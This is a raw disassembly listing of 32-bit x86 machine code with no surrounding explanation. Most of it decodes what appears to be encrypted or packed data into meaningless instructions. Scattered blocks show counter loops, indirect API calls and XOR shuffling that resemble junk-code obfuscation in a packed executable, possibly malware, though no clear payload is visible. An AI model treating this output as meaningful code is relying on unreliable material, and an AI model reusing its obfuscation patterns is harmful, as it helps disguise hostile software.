  40a1a5:	std    
  40a1a6:	shl    BYTE PTR [edi-0x60],0x9c
  40a1aa:	push   esp
  40a1ab:	push   ebx
  40a1ac:	lahf   
  40a1ad:	hlt    
  40a1ae:	dec    esp
  40a1af:	(bad)  
  40a1b0:	(bad)  
  40a1b2:	loopne 0x40a144
  40a1b4:	adc    al,0x66
  40a1b6:	mov    ebx,0x56a5c424
  40a1bb:	push   ebp
  40a1bc:	shl    BYTE PTR [ecx+0x53072d2c],cl
  40a1c2:	retf   
  40a1c3:	popf   
  40a1c4:	sbb    BYTE PTR [edi+0x5a],ch
  40a1c7:	lea    ecx,[ecx]
  40a1c9:	dec    edi
  40a1ca:	mov    WORD PTR [esi+0x46],es
  40a1cd:	dec    edi
  40a1ce:	sbb    esp,DWORD PTR [ebx+eax*1]
  40a1d1:	test   DWORD PTR [edx],eax
  40a1d3:	mov    ecx,0x91c9d63b
  40a1d8:	ss dec esi
  40a1da:	imul   bh
  40a1dc:	repz cwde 
  40a1de:	mov    WORD PTR [ebp-0x41],ds
  40a1e1:	std    
  40a1e2:	lods   eax,DWORD PTR ds:[esi]
  40a1e3:	shr    BYTE PTR [ecx-0x5f],cl
  40a1e6:	in     eax,dx
  40a1e7:	xlat   BYTE PTR ds:[ebx]
  40a1e8:	shl    DWORD PTR [esi-0x31535e84],cl
  40a1ee:	mov    esp,0x1096c0f6
  40a1f3:	test   ecx,esp
  40a1f5:	adc    eax,0x8d56f03
  40a1fa:	rcl    ebp,0x61
  40a1fd:	pop    ds
  40a1fe:	mov    bh,0x29
  40a200:	jp     0x40a1e3
  40a202:	push   es
  40a203:	fld    QWORD PTR [ebx]
  40a205:	stos   BYTE PTR es:[edi],al
  40a206:	xor    DWORD PTR [edx+0x79],ebp
  40a209:	xor    ch,BYTE PTR [ecx]
  40a20b:	mov    al,0x3e
  40a20d:	mov    ecx,0x3ccf7090
  40a212:	addr16 mov al,ds:0xf328
  40a216:	inc    ebp
  40a217:	je     0x40a272
  40a219:	xor    al,0x5a
  40a21b:	jmp    0xcede:0xd316c5e1
  40a222:	or     BYTE PTR [eax],0x30
  40a225:	inc    ecx
  40a226:	les    esi,FWORD PTR [edx-0x64]
  40a229:	cs pop ebx
  40a22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22c:	addr16 jo 0x40a1f6
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x392da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fc6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fc6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fc6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fc6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e267
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e0a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e68f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	jbe    0x40a2ae
  40a2c6:	xor    eax,0x70f545c0
  40a2cb:	jo     0x40a26c
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2ac
  40a2d1:	data16 je 0x40a25a
  40a2d4:	dec    edx
  40a2d5:	mov    ebx,0x33b690ab
  40a2da:	pop    esp
  40a2db:	aaa    
  40a2dc:	mov    dh,0x57
  40a2de:	cmp    BYTE PTR [esi-0x72],dl
  40a2e1:	mov    edx,ecx
  40a2e3:	add    ch,al
  40a2e5:	dec    edi
  40a2e6:	mov    dl,0x75
  40a2e8:	(bad)  
  40a2e9:	xor    ebx,eax
  40a2eb:	cmp    eax,0x7cb2ed02
  40a2f0:	ja     0x40a2c0
  40a2f2:	add    al,0xb5
  40a2f4:	push   cs
  40a2f5:	in     eax,0xc8
  40a2f7:	mov    al,0xe9
  40a2f9:	jecxz  0x40a2f7
  40a2fb:	mov    dh,0x57
  40a2fd:	fwait
  40a2fe:	ss loope 0x40a31d
  40a301:	dec    eax
  40a302:	add    DWORD PTR [esi-0x3882586b],0x48
  40a309:	adc    DWORD PTR [edx-0x52e87164],eax
  40a30f:	jb     0x40a2cc
  40a311:	aad    0x71
  40a313:	inc    ebx
  40a314:	xchg   esp,eax
  40a315:	jbe    0x40a2a8
  40a317:	adc    BYTE PTR [ebx-0x3e4c053],bh
  40a31d:	sub    BYTE PTR [ecx-0x31],ah
  40a320:	cdq    
  40a321:	push   esi
  40a322:	stc    
  40a323:	or     al,0x9b
  40a325:	(bad)  
  40a326:	jo     0x40a331
  40a328:	dec    edx
  40a329:	adc    eax,esp
  40a32b:	and    BYTE PTR [edi-0x63d12879],al
  40a331:	dec    ebx
  40a332:	repz in al,0x6e
  40a335:	stc    
  40a336:	inc    edx
  40a337:	xor    DWORD PTR [ecx],esi
  40a339:	and    al,0x8b
  40a33b:	push   cs
  40a33c:	xor    eax,0x4ee83774
  40a341:	or     dl,BYTE PTR [eax]
  40a343:	stos   DWORD PTR es:[edi],eax
  40a344:	inc    edi
  40a345:	sub    DWORD PTR [ebp+0xe],esp
  40a348:	pop    es
  40a349:	inc    edx
  40a34a:	test   al,0xfa
  40a34d:	cmp    al,0x59
  40a34f:	push   ds
  40a350:	lock lock data16 adc al,0x9c
  40a355:	pusha  
  40a356:	push   cs
  40a357:	adc    edi,ebp
  40a359:	sub    edx,DWORD PTR [edi-0xb]
  40a35c:	xchg   ecx,eax
  40a35d:	jl     0x40a38f
  40a35f:	mov    ds:0x490dcce3,al
  40a364:	retf   
  40a365:	loop   0x40a379
  40a367:	(bad)  
  40a368:	cld    
  40a369:	inc    edx
  40a36a:	push   ss
  40a36b:	add    BYTE PTR [edi],dl
  40a36d:	sbb    edi,DWORD PTR [ebp+0x5946046c]
  40a373:	mov    ebx,0x123c3530
  40a378:	test   eax,0x206238e9
  40a37d:	nop
  40a37e:	adc    cl,BYTE PTR [edi+ebx*1]
  40a381:	sub    DWORD PTR [ebx+0x5998b084],ecx
  40a387:	addr16 cmc 
  40a389:	(bad)  
  40a38a:	push   0xffffffeb
  40a38c:	pop    esi
  40a38d:	fidiv  DWORD PTR [ebx-0x611377c0]
  40a393:	ds add eax,0xb28197a9
  40a399:	and    BYTE PTR [esi-0x8],dl
  40a39c:	lahf   
  40a39d:	shl    DWORD PTR [ebp+0x65c828bb],1
  40a3a3:	adc    dh,BYTE PTR [ebx-0x20284cb9]
  40a3a9:	jnp    0x40a400
  40a3ab:	adc    ebp,ebx
  40a3ad:	cli    
  40a3ae:	or     eax,0xf15facad
  40a3b3:	loope  0x40a350
  40a3b5:	push   edx
  40a3b6:	adc    BYTE PTR [edx+eiz*2],0x45
  40a3ba:	mov    ds:0x7c4e9912,eax
  40a3bf:	ins    DWORD PTR es:[edi],dx
  40a3c0:	dec    esp
  40a3c1:	xor    eax,0xd234a48b
  40a3c6:	sub    BYTE PTR [esi-0xe9a9136],al
  40a3cc:	mov    ebp,0x88cafde6
  40a3d1:	ins    BYTE PTR es:[edi],dx
  40a3d2:	adc    BYTE PTR [ebp-0x62],bh
  40a3d5:	sahf   
  40a3d6:	stc    
  40a3d7:	adc    al,0x4d
  40a3d9:	sbb    eax,0xab316d9e
  40a3de:	dec    eax
  40a3df:	pop    eax
  40a3e0:	mov    ch,0x46
  40a3e2:	add    eax,0xf38fb415
  40a3e7:	jns    0x40a39f
  40a3e9:	and    ch,BYTE PTR [edx+ebp*1]
  40a3ec:	loopne 0x40a461
  40a3ee:	xor    al,0xcc
  40a3f0:	push   ss
  40a3f1:	ret    
  40a3f2:	push   ds
  40a3f3:	adc    edx,0x73eb0e87
  40a3f9:	mov    DWORD PTR [ecx],edx
  40a3fb:	push   0xffffffc2
  40a3fd:	xor    eax,DWORD PTR [eax-0x57591bc]
  40a403:	jle    0x40a466
  40a405:	mov    esi,0xc1712979
  40a40a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a40b:	enter  0xdc95,0xe4
  40a40f:	add    BYTE PTR [edi],ah
  40a411:	int3   
  40a412:	mov    al,ds:0xeaa2809c
  40a417:	and    ah,bl
  40a419:	stc    
  40a41a:	fisttp QWORD PTR [eax+0x22770f33]
  40a420:	sbb    al,BYTE PTR [edx-0x3187fd1e]
  40a426:	inc    esp
  40a427:	lea    esi,[esi-0x4f]
  40a42a:	loopne 0x40a417
  40a42c:	cmp    al,BYTE PTR ds:0x556a0f0d
  40a432:	and    BYTE PTR [ebp-0x4d96ede6],0x10
  40a439:	test   eax,0x88e2f87
  40a43e:	rol    BYTE PTR [esi+0x2c8e41a3],cl
  40a444:	dec    esp
  40a445:	xchg   esp,eax
  40a446:	mov    ebx,0xbbb41471
  40a44b:	xor    eax,0xc28fa3e6
  40a450:	mov    DWORD PTR [ecx-0x3f],ebx
  40a453:	mov    esi,0x654ca85e
  40a458:	(bad)  
  40a459:	sbb    bl,BYTE PTR [edx]
  40a45b:	fwait
  40a45c:	xchg   edi,eax
  40a45d:	xchg   esi,eax
  40a45e:	adc    eax,0xffedc92f
  40a463:	dec    eax
  40a464:	pop    esp
  40a465:	push   edx
  40a466:	mov    esi,0x2fe3c1ce
  40a46b:	cmp    esp,eax
  40a46d:	sbb    DWORD PTR [edi],ebp
  40a46f:	sbb    ebx,edx
  40a471:	and    eax,0x6301edf
  40a476:	(bad)  
  40a477:	mov    cl,0x7f
  40a479:	lods   eax,DWORD PTR ds:[esi]
  40a47a:	and    edi,DWORD PTR [ecx+0x3860835d]
  40a480:	push   cs
  40a481:	(bad)  
  40a482:	fadd   QWORD PTR ds:0xf65e1456
  40a488:	inc    edx
  40a489:	adc    dh,BYTE PTR ds:0xec571db1
  40a48f:	jecxz  0x40a4bc
  40a491:	ins    BYTE PTR es:[edi],dx
  40a492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a493:	in     al,0x12
  40a495:	mov    ecx,0x895631c4
  40a49a:	aaa    
  40a49b:	mov    ebp,0x26aa8038
  40a4a0:	retf   0xd7e6
  40a4a3:	adc    bh,dh
  40a4a5:	mov    bh,0x32
  40a4a7:	rcr    BYTE PTR ds:0xa07d6f37,cl
  40a4ad:	iret   
  40a4ae:	sbb    BYTE PTR [esp+ebp*1+0x135b64fb],ch
  40a4b5:	(bad)  
  40a4b6:	adc    esi,DWORD PTR [ebp+0x6bf93ac8]
  40a4bc:	mov    DWORD PTR ds:0xea170f24,edx
  40a4c2:	jbe    0x40a514
  40a4c4:	addr16 in al,dx
  40a4c6:	leave  
  40a4c7:	mov    eax,ds:0xbdf442af
  40a4cc:	xchg   edx,eax
  40a4cd:	mov    al,0x13
  40a4cf:	dec    ebp
  40a4d0:	ret    0xb795
  40a4d3:	neg    ecx
  40a4d5:	gs sbb DWORD PTR gs:[eax],esi
  40a4d9:	sub    al,0xed
  40a4db:	xor    DWORD PTR [edx+0x2195841b],0x94e2ed74
  40a4e5:	inc    edi
  40a4e6:	std    
  40a4e7:	inc    ebx
  40a4e8:	mov    ah,0x90
  40a4ea:	add    cl,BYTE PTR [edx+eax*2+0x1f2be1b7]
  40a4f1:	pop    esp
  40a4f2:	mov    al,dh
  40a4f4:	push   eax
  40a4f5:	bound  esp,QWORD PTR [edi-0x7edf1188]
  40a4fb:	push   ebp
  40a4fc:	sub    ebp,DWORD PTR [ecx-0x67ef10b4]
  40a502:	into   
  40a503:	mov    al,0xaf
  40a505:	popf   
  40a506:	jmp    edi
  40a508:	scas   al,BYTE PTR es:[edi]
  40a509:	or     bl,ah
  40a50b:	int3   
  40a50c:	pop    ebp
  40a50d:	shl    BYTE PTR [ebp+0x2d],cl
  40a510:	cdq    
  40a511:	push   eax
  40a512:	lea    esp,[esi]
  40a514:	and    esp,ebp
  40a516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a517:	jle    0x40a519
  40a519:	pop    ecx
  40a51a:	mov    ecx,0xf0588891
  40a51f:	jecxz  0x40a505
  40a521:	or     bh,BYTE PTR [edx-0x7f6e221c]
  40a527:	scas   eax,DWORD PTR es:[edi]
  40a528:	aad    0x3e
  40a52a:	mov    cl,0xb4
  40a52c:	lds    edx,FWORD PTR [eax]
  40a52e:	mov    ss,WORD PTR [edx]
  40a530:	gs jne 0x40a559
  40a533:	push   edi
  40a534:	or     al,0xf7
  40a536:	adc    cl,bh
  40a538:	imul   ebx,DWORD PTR [eax-0x6],0x392b304d
  40a53f:	dec    edx
  40a540:	call   0x4200:0x264565ee
  40a547:	fdivr  st(4),st
  40a549:	mov    bl,0xf7
  40a54b:	xor    al,0xc
  40a54d:	movq   QWORD PTR [esi],mm0
  40a550:	aas    
  40a551:	sbb    eax,0xc8994aa6
  40a556:	xlat   BYTE PTR ds:[ebx]
  40a557:	test   DWORD PTR [ebp+0x35afbde3],0xd7cd152f
  40a561:	cs inc edi
  40a563:	mov    dl,0x81
  40a565:	or     cl,al
  40a567:	cwde   
  40a568:	test   DWORD PTR [edi-0x13],edx
  40a56b:	mov    cs,WORD PTR [ebp+0x2d1b4b73]
  40a571:	push   0xae1a4efa
  40a576:	xchg   DWORD PTR [edx],esp
  40a578:	repz sub esp,ecx
  40a57b:	jnp    0x40a512
  40a57d:	rcr    BYTE PTR [esp+edi*8+0x4],cl
  40a581:	imul   esp,DWORD PTR [ebx-0x14287711],0xffffffe2
  40a588:	pop    esi
  40a589:	and    edx,ebx
  40a58b:	push   0x12
  40a58d:	fwait
  40a58e:	outs   dx,DWORD PTR ds:[esi]
  40a58f:	leave  
  40a590:	sub    BYTE PTR [ecx],al
  40a592:	pop    ecx
  40a593:	imul   ecx,DWORD PTR [esi+ecx*1],0x538cc039
  40a59a:	sbb    al,0x2e
  40a59c:	adc    eax,0x448eb0f9
  40a5a1:	ja     0x40a56c
  40a5a3:	xchg   BYTE PTR [esi-0x7a],cl
  40a5a6:	adc    eax,0x838876b2
  40a5ab:	nop
  40a5ac:	xchg   edi,eax
  40a5ad:	pop    ds
  40a5ae:	mov    edi,esp
  40a5b0:	mov    bl,0x6d
  40a5b2:	aas    
  40a5b3:	or     dl,dl
  40a5b5:	mov    al,ds:0xb0139f1f
  40a5ba:	gs inc ecx
  40a5bc:	push   es
  40a5bd:	mov    al,0x12
  40a5bf:	mov    WORD PTR [edi+esi*8],fs
  40a5c2:	loope  0x40a594
  40a5c4:	test   DWORD PTR [ecx+0x764bda7],ebx
  40a5ca:	repz cmp al,0xb9
  40a5cd:	mov    eax,ds:0x979ea2d
  40a5d2:	push   cs
  40a5d3:	adc    eax,0xa5dc4926
  40a5d8:	(bad)  
  40a5d9:	mov    cs,WORD PTR cs:[edx-0x540e11b0]
  40a5e0:	in     al,dx
  40a5e1:	inc    edi
  40a5e2:	nop
  40a5e3:	sub    edi,DWORD PTR [ebx-0x339b7404]
  40a5e9:	dec    esi
  40a5ea:	push   ebx
  40a5eb:	add    BYTE PTR [edx-0x684d69ff],bl
  40a5f1:	imul   esi,DWORD PTR ds:0xccb2e93e,0x63ef50e4
  40a5fb:	sbb    eax,0x48488a4c
  40a600:	in     eax,0xd3
  40a602:	mov    ebx,0xb83d0672
  40a607:	xchg   BYTE PTR [ebp+0x5b634670],bh
  40a60d:	mov    esi,0x40be2ef
  40a612:	sti    
  40a613:	pop    ss
  40a614:	sub    edx,DWORD PTR [ebx-0x39fc9770]
  40a61a:	adc    DWORD PTR [ebx-0xb],eax
  40a61d:	aad    0x7d
  40a61f:	sub    al,ch
  40a621:	jns    0x40a649
  40a623:	sbb    DWORD PTR [edx+0x40630bd0],edi
  40a629:	jne    0x40a633
  40a62b:	fwait
  40a62c:	inc    ebp
  40a62d:	rcr    DWORD PTR [esi],0x81
  40a630:	retf   0xb93b
  40a633:	jle    0x40a68f
  40a635:	(bad)  
  40a636:	retf   
  40a637:	mov    esp,0x651d7855
  40a63d:	xor    ah,BYTE PTR [ecx]
  40a63f:	jmp    0xcc3fba28
  40a644:	push   eax
  40a645:	lods   eax,DWORD PTR ds:[esi]
  40a646:	push   es
  40a647:	dec    edi
  40a648:	dec    ebp
  40a649:	lock popa 
  40a64b:	jmp    0xf1ad:0xd5a2d623
  40a652:	aad    0xb0
  40a654:	push   eax
  40a655:	fs adc al,0x1b
  40a658:	push   ebp
  40a659:	xchg   esi,eax
  40a65a:	adc    DWORD PTR [edi-0x36b8788e],esi
  40a660:	clc    
  40a661:	push   ebp
  40a662:	(bad)  [ecx-0x6b9ae2c9]
  40a668:	iret   
  40a669:	adc    edi,DWORD PTR [esi+edx*2]
  40a66c:	xchg   DWORD PTR [esi-0x385b1274],ebp
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e66f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e66f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e66f,edx
  40a698:	cmp    DWORD PTR ds:0x42e66f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e677
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e26b
  40a6c6:	cmp    DWORD PTR ds:0x42e66f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e66f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e66f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e66f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fc5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fc5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fc5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fc5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fc5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e1ed
  40a728:	push   0x42e1db
  40a72d:	call   DWORD PTR ds:0x42e4c7
  40a733:	cmp    DWORD PTR ds:0x42fc5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fc5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fc5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e0b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e693
  40a760:	mov    DWORD PTR ds:0x42e0b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e693,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fc51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fc65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e693,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fc79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fc89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e0b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e0b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e0b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e167
  40a7e8:	push   0x42e1bd
  40a7ed:	push   0x42e1bd
  40a7f2:	call   DWORD PTR ds:0x42e26f
  40a7f8:	cmp    DWORD PTR ds:0x42e0b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e0b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e0b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e0b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e0b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e0ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fcee
  40a839:	add    DWORD PTR ds:0x42e687,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	sbb    DWORD PTR [edi],ebx
  40a855:	jne    0x40a89d
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7f8
  40a860:	mov    eax,DWORD PTR [ecx+0x2586d856]
  40a866:	test   al,0x15
  40a868:	ret    
  40a869:	mov    eax,ds:0xa67fc901
  40a86e:	outs   dx,DWORD PTR ds:[esi]
  40a86f:	lods   al,BYTE PTR ds:[esi]
  40a870:	and    al,0x12
  40a872:	imul   DWORD PTR [edi-0x2fc00a0a]
  40a878:	in     eax,dx
  40a879:	cwde   
  40a87a:	clc    
  40a87b:	fcomp  DWORD PTR [edx-0x45]
  40a87e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a87f:	cmp    esi,edx
  40a881:	mov    ah,0x6d
  40a883:	ss retf 
  40a885:	aam    0xa4
  40a887:	shl    DWORD PTR [eax-0x1c],0xc7
  40a88b:	sbb    ecx,edi
  40a88d:	mov    ebp,0x50672cb8
  40a892:	add    dh,BYTE PTR [ecx+0x6]
  40a895:	adc    DWORD PTR [esi],eax
  40a897:	fwait
  40a898:	dec    edi
  40a899:	outs   dx,BYTE PTR ds:[esi]
  40a89a:	xchg   ebx,eax
  40a89b:	pop    es
  40a89c:	jo     0x40a83f
  40a89e:	fst    QWORD PTR cs:[edi]
  40a8a1:	ret    0x8828
  40a8a4:	push   edi
  40a8a5:	and    dl,0xe6
  40a8a8:	jl     0x40a902
  40a8aa:	sgdtd  [ecx]
  40a8ad:	mov    al,ds:0xf34b84ab
  40a8b2:	in     al,0x93
  40a8b4:	dec    ebp
  40a8b5:	jae    0x40a922
  40a8b7:	scas   eax,DWORD PTR es:[edi]
  40a8b8:	mov    eax,ds:0x4a01f371
  40a8bd:	scas   al,BYTE PTR es:[edi]
  40a8be:	fcom   QWORD PTR [ebx-0xc]
  40a8c1:	enter  0xf35e,0x3d
  40a8c5:	scas   al,BYTE PTR es:[edi]
  40a8c6:	cmp    edi,DWORD PTR [edi-0x55]
  40a8c9:	pop    edi
  40a8ca:	dec    edi
  40a8cb:	inc    edx
  40a8cc:	call   0x3fe2:0x35317ab4
  40a8d3:	sub    DWORD PTR [edi-0x3a316033],esi
  40a8d9:	aad    0xa6
  40a8db:	ret    
  40a8dc:	hlt    
  40a8dd:	mov    ch,0x5b
  40a8df:	push   cs
  40a8e0:	push   edx
  40a8e1:	rol    cl,1
  40a8e3:	jnp    0x40a8b6
  40a8e5:	adc    al,0xd4
  40a8e7:	and    al,BYTE PTR [ecx+0x947389b]
  40a8ed:	add    eax,0x1b4decfc
  40a8f2:	mov    ah,0xf1
  40a8f4:	inc    edi
  40a8f5:	out    dx,eax
  40a8f6:	jns    0x40a908
  40a8f8:	fcmove st,st(0)
  40a8fa:	ja     0x40a884
  40a8fc:	int3   
  40a8fd:	imul   edx,DWORD PTR [eax-0x73],0x60
  40a901:	fdivr  DWORD PTR ds:0x5ddc8445
  40a907:	push   ds
  40a908:	in     eax,dx
  40a909:	scas   al,BYTE PTR es:[edi]
  40a90a:	pop    edi
  40a90b:	cmp    eax,0x91d7378b
  40a910:	mov    ebp,0x4ca9a591
  40a915:	sbb    BYTE PTR [edx-0x6e],cl
  40a918:	xor    eax,0xf4aa10f9
  40a91d:	adc    ch,ch
  40a91f:	cwde   
  40a920:	ja     0x40a941
  40a922:	xor    BYTE PTR [ecx+ebp*1-0x2e],cl
  40a926:	mov    al,0x19
  40a928:	pushf  
  40a929:	xor    eax,0xd5dbba4e
  40a92e:	mov    ebx,0xb87e777a
  40a933:	mov    bh,0x51
  40a935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a936:	es in  al,0xed
  40a939:	into   
  40a93a:	pop    esp
  40a93b:	add    dh,BYTE PTR [ebp-0x75]
  40a93e:	pop    ss
  40a93f:	mov    ?,WORD PTR [edx+ecx*4-0x38]
  40a943:	pop    esp
  40a944:	mov    WORD PTR [edi],ss
  40a946:	sub    BYTE PTR [edx],ah
  40a948:	ss pop eax
  40a94a:	dec    ebx
  40a94b:	jl     0x40a945
  40a94d:	fild   QWORD PTR [edx+0x7]
  40a950:	rcr    BYTE PTR [esp+0x37e5a2de],cl
  40a957:	add    edi,ebx
  40a959:	mov    ecx,0x49e0d890
  40a95e:	imul   ebx,esp,0xdd8d4468
  40a964:	gs iretw 
  40a967:	or     ch,BYTE PTR [eax-0x7a9df36d]
  40a96d:	(bad)  
  40a96e:	sbb    bl,BYTE PTR [ebp-0xc3b1185]
  40a974:	lahf   
  40a975:	cmp    BYTE PTR [esi-0x44],dh
  40a978:	mov    eax,ds:0x6ce9476a
  40a97d:	call   0xe800:0xd27f873c
  40a984:	push   0xfffffff8
  40a986:	mov    bh,0xa1
  40a988:	pop    esi
  40a989:	xchg   edi,eax
  40a98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98b:	push   es
  40a98c:	push   ss
  40a98d:	in     eax,dx
  40a98e:	mov    dh,0x3a
  40a990:	jmp    0x40a9e5
  40a992:	sbb    DWORD PTR [edx+0x2d],edx
  40a995:	pop    ebp
  40a996:	cmp    cl,BYTE PTR [edi+0x6ab9356b]
  40a99c:	and    BYTE PTR [ecx+0x93beae9],ah
  40a9a2:	push   ss
  40a9a3:	xor    dh,BYTE PTR [edx+edx*4-0x1ebf358d]
  40a9aa:	xrelease xchg BYTE PTR [edx],ch
  40a9ad:	adc    eax,0x3a431492
  40a9b2:	mov    cl,0xbc
  40a9b4:	add    DWORD PTR [ecx+0x23a1574c],0xffffffd8
  40a9bb:	ins    DWORD PTR es:[edi],dx
  40a9bc:	out    dx,eax
  40a9bd:	dec    ebp
  40a9be:	pusha  
  40a9bf:	lds    esi,FWORD PTR [edx+edx*4]
  40a9c2:	mov    eax,ds:0x878c14c4
  40a9c7:	jne    0x40a9d9
  40a9c9:	lahf   
  40a9ca:	jmp    0xa2643aac
  40a9cf:	test   DWORD PTR [edx-0x31],0xb77a55a2
  40a9d6:	pop    edx
  40a9d7:	leave  
  40a9d8:	adc    ah,BYTE PTR [edi+esi*1]
  40a9db:	mov    dh,0x6b
  40a9dd:	cmp    DWORD PTR [eax-0x80],0xffffffdc
  40a9e1:	jmp    0xcc2759ff
  40a9e6:	iret   
  40a9e7:	ret    0x5463
  40a9ea:	or     ecx,ecx
  40a9ec:	aaa    
  40a9ed:	inc    edx
  40a9ee:	xchg   DWORD PTR [esi],eax
  40a9f0:	pop    es
  40a9f1:	icebp  
  40a9f2:	outs   dx,BYTE PTR ds:[esi]
  40a9f3:	pop    es
  40a9f4:	fwait
  40a9f5:	xchg   edx,eax
  40a9f6:	mov    ebx,0x9bb8e92c
  40a9fb:	ss inc edx
  40a9fd:	rcr    DWORD PTR [ebp+0x5],0xac
  40aa01:	clc    
  40aa02:	cmp    BYTE PTR [edi],cl
  40aa04:	sub    eax,0x2dd30383
  40aa09:	nop
  40aa0a:	test   ecx,edi
  40aa0c:	add    DWORD PTR [edi-0x61],eax
  40aa0f:	jns    0x40aa23
  40aa11:	(bad)  
  40aa12:	jl     0x40aa06
  40aa14:	lods   al,BYTE PTR ds:[esi]
  40aa15:	pop    es
  40aa16:	cmp    BYTE PTR [edx+0x4aa70adf],ch
  40aa1c:	test   DWORD PTR [ecx-0x56],edi
  40aa1f:	mov    edx,0xe8d01e12
  40aa24:	sti    
  40aa25:	and    dl,BYTE PTR [ebx]
  40aa27:	lods   al,BYTE PTR ds:[esi]
  40aa28:	jb     0x40a9cb
  40aa2a:	mov    esi,0x8aec8d01
  40aa2f:	pop    es
  40aa30:	adc    dl,BYTE PTR [esi-0x33]
